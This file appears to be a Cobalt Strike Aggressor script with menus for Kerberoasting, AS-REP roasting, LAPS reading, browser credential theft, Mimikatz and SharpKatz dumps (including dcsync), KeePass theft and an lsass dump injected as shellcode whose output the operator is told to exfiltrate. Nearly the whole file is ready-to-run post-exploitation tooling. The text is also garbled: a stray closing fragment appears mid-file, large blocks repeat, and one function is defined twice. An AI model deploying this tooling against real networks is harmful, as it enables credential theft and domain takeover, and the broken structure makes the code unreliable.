###############################
##
## Begin Kerberoast
##
##############################




menu "Kerberoast and SPN's - T1208" {
		item "Rubeus Kerberoast - Full"{
			local('$bid');
				foreach $bid ($1){
					kerberoastfull($bid);
				}
			}
			
		item "Rubeus Kerberoast ADSI Recon - Best Opsec"{
			local('$bid');
				foreach $bid ($1){
					kerberoastadsi($bid);
				}
			}
			
					
		item "Rubeus Kerberoast Opsec"{
			local('$bid');
				foreach $bid ($1){
					kerberoastfull($bid);
				}
			}

		item "Rubeus Kerberoast Admin"{
			local('$bid');
				foreach $bid ($1){
					kerberoastadmin($bid);
				}
			}

		item "Rubeus Kerberoast accts w/old Passwords"{
			local('$bid');
				foreach $bid ($1){
					kerberoastoldpwd($bid);
				}
			}
			
item "Kerberoast Singular User - T1208"{

    local('$bid');
        foreach $bid ($1){
            snipekerberoast($bid);
     }
    }

		} #End Kerberoast Menu


###Full Kerberoast function

sub kerberoastfull{
bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast");
}
######

###Opsec Kerberoast function

sub kerberoastfull{
bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /opsec");
}
######

###Admin Kerberoast function

sub kerberoastadmin{
bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /ldapfilter:'admincount=1'");
}
######

###Old Password Kerberoast function

sub kerberoastoldpwd{
bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "kerberoast /pwdsetbefore:03-29-2019");
}

# Kerberoast Single User
sub snipekerberoast{
prompt_text("Enter Single SPN/User Name to Kerberoast", "", lambda({
bexecute_assembly($bids, script_resource('exe/Rubeus.exe'), "kerberoast /user:$1 /output:hashcat");
}, $bids => $1));
}

sub kerberoastadsi{
fireAlias($1, "Recon-AD-SPNs");
}

######

###############################
##
## End Kerberoast
##
##############################


###############################
##
## Begin Read Laps Password
##
##############################





item "Read LAPS Password"{
        prompt_text("Enter Host Name of Computer you want the LAPS Password FQDN Preferred", "", lambda({
                    bexecute_assembly($bids, script_resource('/exe/SharpView.exe'), "Get-DomainObject -Identity $1 -Properties ms-mcs-admpwd");                
                }, $bids => $1));
			}



###############################
##
## End Read Laps Password
##
##############################




###############################
##
## Begin AS-REP Roasting
##
##############################




		item "AS-REP Roasting"{
			local('$bid');
				foreach $bid ($1){
					asreproast($bid);
				}
			}

####AS-REP Roasting Function 
sub asreproast{
bexecute_assembly($1, script_resource('/exe/Rubeus.exe'), "asreproast");
}
######

###############################
##
## End AS-REP Roasting
##
##############################











###############################
##
## Begin Web Credential Extraction
##
##############################



menu "Extracting Web Credentials - T1503" {

		item "Retrieve All Cookies/History/Logins"{
			local('$bid');
				foreach $bid ($1){
					sharpchromeall($bid);
				}
			}






		item "List Browser Cookies"{
			local('$bid');
				foreach $bid ($1){
					sharpchromecookies($bid);
				}
			}

		item "List User's History"{
			local('$bid');
				foreach $bid ($1){
					sharphistory($bid);
				}
			}

		item "List Login Passwords"{
			local('$bid');
				foreach $bid ($1){
					sharplogins($bid);
				}
			}



menu "SharpWeb" {

		item "Retrieve All Browsers' Data"{
			local('$bid');
				foreach $bid ($1){
					sharpweball($bid);
				}
			}

		item "Retrieve Chrome Data"{
			local('$bid');
				foreach $bid ($1){
					sharpwebchrome($bid);
				}
			}

		item "Retrieve Edge Data"{
			local('$bid');
				foreach $bid ($1){
					sharpwebedge($bid);
				}
			}
		item "Retrieve FireFox Data"{
			local('$bid');
				foreach $bid ($1){
					sharpwebfirefox($bid);
				}
			}



		} #End of SharpWeb Menu


	} #End of Web Credentials Menu



###Grab all the Things

sub sharpchromeall{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "all");
}
######End of all the things

###Grab all the Cookies

sub sharpchromecookies{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "cookies");
}
######End of all the cookies

###Grab History

sub sharphistory{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "history");
}
######End Cookie History Function


###Grab Login Info
sub sharplogins{
bexecute_assembly($1, script_resource('/exe/SharpChromium.exe'), "logins");
}
######End Login Enumeration Function

###Run SharpWeb

####SharpWeb All
sub sharpweball{
bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "all");
}

####SharpWeb FireFox
sub sharpwebfirefox{
bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "firefox");
}

####SharpWeb Chrome
sub sharpwebchrome{
bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "chrome");
}

####SharpWeb Edge
sub sharpwebedge{
bexecute_assembly($1, script_resource('/exe/SharpWeb.exe'), "edge");
}





###############################
##
## Begin Mimikatz Menu
##
##############################
menu "Mimikatz" {
		item "Mimikatz Logon Passwords  - T1003"{
			local('$bid');
				foreach $bid ($1){
					logonpasswords($bid);
				}
			}
		item "Mimikatz WDigest Credentials  - T1003"{
			local('$bid');
				foreach $bid ($1){
					wdigest($bid);
				}
			}
		item "Mimikatz Kerberos Credentials  - T1003"{
			local('$bid');
				foreach $bid ($1){
					kerberos($bid);
				}
			}
		item "Mimikatz MSV LM & NTLM Passwords  - T1003"{
			local('$bid');
				foreach $bid ($1){
					msv($bid);
				}
			}
		item "Mimikatz TsPkg Passwords  - T1003"{
			local('$bid');
				foreach $bid ($1){
					tspkg($bid);
				}
			}
		item "Mimikatz LiveSSP passwords  - T1003"{
			local('$bid');
				foreach $bid ($1){
					livessp($bid);
				}
			}
		item "Mimikatz SSP passwords  - T1003"{
			local('$bid');
				foreach $bid ($1){
					ssp($bid);
				}
			}

		item "Mimikatz Dump Trust  - T1003"{
			local('$bid');
				foreach $bid ($1){
					trust($bid);
				}
			}

		item "Mimikatz Backup Keys  - T1003"{
			local('$bid');
				foreach $bid ($1){
					backupkeys($bid);
				}
			}

		item "Mimikatz Tickets  - T1003"{
			local('$bid');
				foreach $bid ($1){
					tickets($bid);
				}
			}

		item "Mimikatz ekeys  - T1003"{
			local('$bid');
				foreach $bid ($1){
					ekeys($bid);
				}
			}

		item "Mimikatz DPAPI  - T1003"{
			local('$bid');
				foreach $bid ($1){
					dpapi($bid);
				}
			}

		item "Mimikatz DPAPI System Secret  - T1003"{
			local('$bid');
				foreach $bid ($1){
					dpapisystem($bid);
				}
			}

		item "Mimikatz Credential Manager  - T1003"{
			local('$bid');
				foreach $bid ($1){
					credman($bid);
				}
			}

###############################
##
## End Mimikatz Menu
##
##############################



        } #This is the end of the Mimikatz Menu
    
  

###############################
##
## Begin Mimikatz Functions
##
##############################

sub logonpasswords{

bmimikatz($1, "sekurlsa::logonpasswords");

}
sub wdigest{

bmimikatz($1, "sekurlsa::wdigest");

}
sub kerberos{

bmimikatz($1, "sekurlsa::kerberos");

}
sub msv{

bmimikatz($1, "sekurlsa::msv");

}
sub tspkg{

bmimikatz($1, "sekurlsa::tspkg");

}
sub livessp{

bmimikatz($1, "sekurlsa::livessp");

}
sub ssp{

bmimikatz($1, "sekurlsa::ssp");

}


sub trust{

bmimikatz($1, "sekurlsa::trust");

}
sub backupkeys{

bmimikatz($1, "sekurlsa::backupkeys");

}
sub tickets{

bmimikatz($1, "sekurlsa::tickets");

}
sub ekeys{

bmimikatz($1, "sekurlsa::ekeys");

}

sub dpapi{

bmimikatz($1, "sekurlsa::dpapi");

}

sub dpapisystem{

bmimikatz($1, "sekurlsa::dpapi");

}

sub credman{

bmimikatz($1, "sekurlsa::credman");

}



###############################
##
## End Mimikatz Functions
##
##############################

#################################################

#   SharpKatz

#################################################

menu "SharpKatz"{
# SharpKatz Debug Privilege
item "SharpKatz Logon Passwords  - T1003"{
	local('$bid');
		foreach $bid ($1){
			sklogonpasswords($bid);
		}
	}
item "SharpKatz WDigest Credentials  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skwdigest($bid);
		}
	}
item "SharpKatz Kerberos Credentials  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skkerberos($bid);
		}
	}
item "SharpKatz MSV LM & NTLM Passwords  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skmsv($bid);
		}
	}
item "SharpKatz TsPkg Passwords  - T1003"{
	local('$bid');
		foreach $bid ($1){
			sktspkg($bid);
		}
	}
item "SharpKatz ekeys  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skekeys($bid);
		}
	}
item "SharpKatz Credential Manager  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skcredman($bid);
		}
	}
item "SharpKatz Dump User Credential By Username  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncusername($bid);
		}
	}
item "SharpKatz Dump User Credential By GUID - T1003"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncguid($bid);
		}
	}
item "SharpKatz Export Entire Dataset From AD  - T1003"{
	local('$bid');
		foreach $bid ($1){
			skdcsyncdataset($bid);
		}
	}

}


#################################################

#   Dumpert

#################################################

 item "Dumpert  - T1003" {
			local('$bid');
				foreach $bid ($1){
					dumpert($bid);
				}

 }  
 
 
#################################################

#   Kee Thief

################################################# 

 item "KeePass Initialize" {
			local('$bid');
				foreach $bid ($1){
					keethiefinitialize($bid);
				}

 }  
 
 
 item "KeePass Run" {
			local('$bid');
				foreach $bid ($1){
					keethiefsteal($bid);
				}

 }  
 

#KeePass Cred Stealer Initialize			
sub keethiefinitialize{
bpowershell_import($1, script_resource("/subscripts/keethief.ps1"));
}

#Snag KeePass Creds		
sub keethiefsteal{
bpowerpick($1, "Get-ChikfilaFarts -Verbose");
}
 
###############################
##
## Begin Modified Dumpert
##
##############################

#register help
beacon_command_register("dumpert", "Create a minidump of lsass process",
	"Synopsis: dumpert\n\n" .
	"Creates a minidump of lsass process using sRDI shellcode injection and downloads minidump file.\n" .
	"Lsass minidump can be imported in Mimikatz using: \"sekurlsa::minidump dumpert.dmp\"");

alias dumpert {
    $bid = $1;
    $curr_pid = beacon_info($bid, "pid");

    if (-isadmin $bid) {
        blog($bid, "Dumpert by Outflank");
        if (-is64 $bid) {
            bshinject($bid, $curr_pid, "x64", script_resource("exe/Outflank-Dumpert.bin"));
            blog($bid, "The file being written will be in C:\\Windows\\Temp as ATPLogs.csv, please download//exfiltrate this when convenient and turn the file into a .dmp to use with mimikatz minidump");
            bpause($bid, 10000);
            return;
        }
        else{
            berror($bid, "Dumpert is x64 only.");
            return;
        }
    }
    else{
        berror($bid, "You need elevated privileges.");
        return;
    }
}

sub dumpert{
fireAlias($1, "dumpert" );    
}

###############################
##
## End Modified Dumpert
##
##############################


#################################################

#   SharpKatz

#################################################

sub sklogonpasswords{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command logonpasswords");

}


sub skwdigest{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command wdigest");

}


sub skkerberos{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command kerberos");

}


sub skmsv{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command msv");

}


sub sktspkg{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command tspkg");

}


sub skekeys{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command ekeys");

}


sub skcredman{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command credman");

}

sub skdcsyncusername{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By Username", %(username => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --User $3['username'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "username",  "Please Enter the username:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncguid{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By GUID", %(guid => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Guid $3['guid'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "guid",  "Please Enter A GUID:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncdataset{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Entire Dataset From AD", %(fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}		

");
}
 
###############################
##
## Begin Modified Dumpert
##
##############################

#register help
beacon_command_register("dumpert", "Create a minidump of lsass process",
	"Synopsis: dumpert\n\n" .
	"Creates a minidump of lsass process using sRDI shellcode injection and downloads minidump file.\n" .
	"Lsass minidump can be imported in Mimikatz using: \"sekurlsa::minidump dumpert.dmp\"");

alias dumpert {
    $bid = $1;
    $curr_pid = beacon_info($bid, "pid");

    if (-isadmin $bid) {
        blog($bid, "Dumpert by Outflank");
        if (-is64 $bid) {
            bshinject($bid, $curr_pid, "x64", script_resource("exe/Outflank-Dumpert.bin"));
            blog($bid, "The file being written will be in C:\\Windows\\Temp as ATPLogs.csv, please download//exfiltrate this when convenient and turn the file into a .dmp to use with mimikatz minidump");
            bpause($bid, 10000);
            return;
        }
        else{
            berror($bid, "Dumpert is x64 only.");
            return;
        }
    }
    else{
        berror($bid, "You need elevated privileges.");
        return;
    }
}

sub dumpert{
fireAlias($1, "dumpert" );    
}

###############################
##
## End Modified Dumpert
##
##############################


#################################################

#   SharpKatz

#################################################

sub sklogonpasswords{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command logonpasswords");

}


sub skwdigest{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command wdigest");

}


sub skkerberos{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command kerberos");

}


sub skmsv{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command msv");

}


sub sktspkg{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command tspkg");

}


sub skekeys{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command ekeys");

}


sub skcredman{

bexecute_assembly($1, script_resource('/exe/SharpKatz.exe'), "--Command credman");

}

sub skdcsyncusername{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By Username", %(username => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --User $3['username'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "username",  "Please Enter the username:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncguid{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Credential By GUID", %(guid => "", fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Guid $3['guid'] --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "guid",  "Please Enter A GUID:");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}

sub skdcsyncdataset{
 $bid = $1;
    $dialog = dialog("SharpKatz Dump Entire Dataset From AD", %(fqdn => "", dc => "", execmethod => "Execute-Assembly"), lambda({
        $cmdargs = "";
        $cmdargs = "--Command dcsync --Domain $3['fqdn'] --DomainController $3['dc'] /ptt";
        if ($3["execmethod"] eq "Execute-Assembly"){
            btask($bid, 'Dumping Creds...');
            bexecute_assembly($bid, script_resource('exe/SharpKatz.exe'), $cmdargs);
        }
    }));
    dialog_description($dialog, "Enumerate Remote Hosts with Seatbelt");
    drow_text($dialog, "fqdn",  "Please Enter the FQDN:");
    drow_text($dialog, "dc",  "Please Enter the FQDN of the Domain Controller:");
    dbutton_action($dialog, "Execute");
    dialog_show($dialog);

}		
